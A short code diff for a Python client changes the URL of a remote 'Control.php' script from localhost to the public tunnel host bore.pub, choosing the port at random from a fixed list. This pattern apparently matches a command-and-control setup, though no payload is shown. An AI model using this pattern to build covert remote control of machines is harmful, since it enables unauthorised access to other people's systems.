@@ -13,8 +13,8 @@ import random
 import shutil
 import threading
 
-# Define the PHP script URL running on your server
-php_script_url = 'http://127.0.0.1:8080/Control.php'
+port = random.choice([61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012])
+php_script_url = f'http://bore.pub:{port}/Control.php'
 
 previous_data = ""
 
